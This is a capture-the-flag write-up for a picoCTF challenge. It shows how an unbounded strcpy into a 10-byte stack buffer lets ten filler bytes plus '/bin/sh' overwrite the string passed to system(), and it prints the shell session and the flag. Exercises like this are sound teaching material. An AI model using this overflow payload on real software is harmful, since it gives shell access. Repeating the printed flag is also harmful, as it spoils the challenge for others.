# Description
```
A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?
```
---

In this exercise, we have 200 bytes of input at `main` which are given to `fun`, and later copied into local variables. The problem is that our input is copied without restrictions (till terminator):
```C
char c[10];  
char buffer[10];

strcpy(c, cmd);  
strcpy(buffer, name);
```
Meaning we have an arbitrary write of another `190` bytes onto the stack, which are copied written directly onto the `c` variable (as it is declared/used first) and onwards. Meaning we can just write 10 garbage bytes and then we'd have 10 bytes which would go directly into `system`;

```shell
$ ./vuln
What is your name?
AAAAAAAAAA/bin/sh # 17 bytes
Goodbye, AAAAAAAAAA/bin/sh!
whoami
ctf-player
ls
flag.txt
cat flag.txt
FLAG{}
```


# Flag
```
picoCTF{0v3rfl0w_c0mm4nd_3766e70a}
```